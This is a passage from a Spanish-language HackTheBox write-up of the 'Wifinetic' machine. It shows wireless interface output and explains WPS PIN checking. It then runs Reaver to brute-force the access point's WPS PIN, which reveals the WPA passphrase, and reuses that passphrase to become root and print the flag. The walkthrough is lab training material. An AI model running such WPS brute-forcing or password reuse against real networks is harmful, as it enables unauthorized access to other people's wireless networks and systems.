		addr 42:00:00:00:01:00
		<span class="nb">type </span>P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		<span class="nb">type </span>managed
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		<span class="nb">type </span>AP
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que wlan0 tiene como nombre su <code class="language-plaintext highlighter-rouge">AP</code> <code class="language-plaintext highlighter-rouge">OpenWRT</code> que opera en el canal 1.</p>
  </li>
  <li>
    <p>Este es mas interesante ya que esta corriendo en modo <code class="language-plaintext highlighter-rouge">managed</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		<span class="nb">type </span>P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		<span class="nb">type </span>managed
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
</code></pre></div></div>

<blockquote>
  <p>type managed: La interfaz está en modo “managed”, también conocido como modo “infraestructura”. Este modo es utilizado en dispositivos clientes que se conectan a un punto de acceso central (como un router). El dispositivo en este modo se comunica a través de un punto de acceso.</p>
</blockquote>

<blockquote>
  <p>El “modo managed” es un tipo de configuración de red inalámbrica en la que la interfaz inalámbrica del dispositivo opera como un cliente dentro de una infraestructura de red WLAN más grande. Este es el modo típico utilizado por los dispositivos que se conectan a un router Wi-Fi. En este modo, todas las decisiones sobre cuándo y cómo transmitir datos a través de la red son administradas por el punto de acceso, y no por la interfaz inalámbrica del cliente.</p>
</blockquote>

<ul>
  <li>
    <p>Como nos mencionan la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> cuando vimos las <code class="language-plaintext highlighter-rouge">capabilities</code> si investigamos la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> pues es un <code class="language-plaintext highlighter-rouge">WPS cracker</code>.</p>
  </li>
  <li>
    <p>Aquí nos explican sobre el PIN <a href="https://outpost24.com/blog/wps-cracking-with-reaver/">https://outpost24.com/blog/wps-cracking-with-reaver/</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/5.png" />
</p>

<blockquote>
  <p>El PIN de WPS, generalmente de 8 dígitos, está impreso en el dispositivo para facilitar el acceso. Los primeros 7 dígitos son aleatorios y el último dígito es un dígito de verificación o checksum, calculado en base a los otros dígitos para detectar errores de entrada.</p>
</blockquote>

<blockquote>
  <p>Durante el proceso de autenticación, el sistema verifica el PIN en dos etapas. Primero, verifica los primeros cuatro dígitos del PIN. Si esta primera parte es correcta, procede a verificar los siguientes tres dígitos (el octavo es el dígito de checksum).</p>
</blockquote>

<ul>
  <li>Para eso usaremos <code class="language-plaintext highlighter-rouge">Reaver</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

Required Arguments:
	<span class="nt">-i</span>, <span class="nt">--interface</span><span class="o">=</span>&lt;wlan&gt;          Name of the monitor-mode interface to use
	<span class="nt">-b</span>, <span class="nt">--bssid</span><span class="o">=</span>&lt;mac&gt;               BSSID of the target AP

Optional Arguments:
	<span class="nt">-m</span>, <span class="nt">--mac</span><span class="o">=</span>&lt;mac&gt;                 MAC of the host system
	<span class="nt">-e</span>, <span class="nt">--essid</span><span class="o">=</span>&lt;ssid&gt;              ESSID of the target AP
	<span class="nt">-c</span>, <span class="nt">--channel</span><span class="o">=</span>&lt;channel&gt;         Set the 802.11 channel <span class="k">for </span>the interface <span class="o">(</span>implies <span class="nt">-f</span><span class="o">)</span>
	<span class="nt">-s</span>, <span class="nt">--session</span><span class="o">=</span>&lt;file&gt;            Restore a previous session file
	<span class="nt">-C</span>, <span class="nt">--exec</span><span class="o">=</span>&lt;<span class="nb">command</span><span class="o">&gt;</span>            Execute the supplied <span class="nb">command </span>upon successful pin recovery
	<span class="nt">-f</span>, <span class="nt">--fixed</span>                     Disable channel hopping
	<span class="nt">-5</span>, <span class="nt">--5ghz</span>                      Use 5GHz 802.11 channels
	<span class="nt">-v</span>, <span class="nt">--verbose</span>                   Display non-critical warnings <span class="o">(</span><span class="nt">-vv</span> or <span class="nt">-vvv</span> <span class="k">for </span>more<span class="o">)</span>
	<span class="nt">-q</span>, <span class="nt">--quiet</span>                     Only display critical messages
	<span class="nt">-h</span>, <span class="nt">--help</span>                      Show <span class="nb">help

</span>Advanced Options:
	<span class="nt">-p</span>, <span class="nt">--pin</span><span class="o">=</span>&lt;wps pin&gt;             Use the specified pin <span class="o">(</span>may be arbitrary string or 4/8 digit WPS pin<span class="o">)</span>
	<span class="nt">-d</span>, <span class="nt">--delay</span><span class="o">=</span>&lt;seconds&gt;           Set the delay between pin attempts <span class="o">[</span>1]
	<span class="nt">-l</span>, <span class="nt">--lock-delay</span><span class="o">=</span>&lt;seconds&gt;      Set the <span class="nb">time </span>to <span class="nb">wait </span><span class="k">if </span>the AP locks WPS pin attempts <span class="o">[</span>60]
	<span class="nt">-g</span>, <span class="nt">--max-attempts</span><span class="o">=</span>&lt;num&gt;        Quit after num pin attempts
	<span class="nt">-x</span>, <span class="nt">--fail-wait</span><span class="o">=</span>&lt;seconds&gt;       Set the <span class="nb">time </span>to <span class="nb">sleep </span>after 10 unexpected failures <span class="o">[</span>0]
	<span class="nt">-r</span>, <span class="nt">--recurring-delay</span><span class="o">=</span>&lt;x:y&gt;     Sleep <span class="k">for </span>y seconds every x pin attempts
	<span class="nt">-t</span>, <span class="nt">--timeout</span><span class="o">=</span>&lt;seconds&gt;         Set the receive <span class="nb">timeout </span>period <span class="o">[</span>10]
	<span class="nt">-T</span>, <span class="nt">--m57-timeout</span><span class="o">=</span>&lt;seconds&gt;     Set the M5/M7 <span class="nb">timeout </span>period <span class="o">[</span>0.40]
	<span class="nt">-A</span>, <span class="nt">--no-associate</span>              Do not associate with the AP <span class="o">(</span>association must be <span class="k">done </span>by another application<span class="o">)</span>
	<span class="nt">-N</span>, <span class="nt">--no-nacks</span>                  Do not send NACK messages when out of order packets are received
	<span class="nt">-S</span>, <span class="nt">--dh-small</span>                  Use small DH keys to improve crack speed
	<span class="nt">-L</span>, <span class="nt">--ignore-locks</span>              Ignore locked state reported by the target AP
	<span class="nt">-E</span>, <span class="nt">--eap-terminate</span>             Terminate each WPS session with an EAP FAIL packet
	<span class="nt">-J</span>, <span class="nt">--timeout-is-nack</span>           Treat <span class="nb">timeout </span>as NACK <span class="o">(</span>DIR-300/320<span class="o">)</span>
	<span class="nt">-F</span>, <span class="nt">--ignore-fcs</span>                Ignore frame checksum errors
	<span class="nt">-w</span>, <span class="nt">--win7</span>                      Mimic a Windows 7 registrar <span class="o">[</span>False]
	<span class="nt">-K</span>, <span class="nt">--pixie-dust</span>                Run pixiedust attack
	<span class="nt">-Z</span>                              Run pixiedust attack

Example:
	reaver <span class="nt">-i</span> wlan0mon <span class="nt">-b</span> 00:90:4C:C1:AC:21 <span class="nt">-vv</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Para usarla simplemente le necesitas proporcionar el nombre de la interfaz en modo monitor y la <code class="language-plaintext highlighter-rouge">MAC</code> del <code class="language-plaintext highlighter-rouge">target</code>.</p>
  </li>
  <li>
    <p>Vamos atacar el target donde se esta corriendo el <strong>AP</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver <span class="nt">-i</span> mon0 <span class="nt">-b</span> 02:00:00:00:00:00 <span class="nt">-vv</span>

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

<span class="o">[</span>+] Waiting <span class="k">for </span>beacon from 02:00:00:00:00:00
<span class="o">[</span>+] Switching mon0 to channel 1
<span class="o">[</span>+] Received beacon from 02:00:00:00:00:00
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[!]</span> Found packet with bad FCS, skipping...
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received M3 message
<span class="o">[</span>+] Sending M4 message
<span class="o">[</span>+] Received M5 message
<span class="o">[</span>+] Sending M6 message
<span class="o">[</span>+] Received M7 message
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[</span>+] Pin cracked <span class="k">in </span>6 seconds
<span class="o">[</span>+] WPS PIN: <span class="s1">'12345670'</span>
<span class="o">[</span>+] WPA PSK: <span class="s1">'WhatIsRealAnDWhAtIsNot51121!'</span>
<span class="o">[</span>+] AP SSID: <span class="s1">'OpenWrt'</span>
<span class="o">[</span>+] Nothing <span class="k">done</span>, nothing to save.
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos el <code class="language-plaintext highlighter-rouge">PIN</code> y la <code class="language-plaintext highlighter-rouge">Password</code>.</li>
</ul>

<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>

<ul>
  <li>Si migramos al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>su root
Password:
root@wifinetic:/# <span class="nb">whoami
</span>root
root@wifinetic:/#
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@wifinetic:~# <span class="nb">cat </span>root.txt
82e27401ce5bb1d85196562913c72da9
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/06/05/wifinetic.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
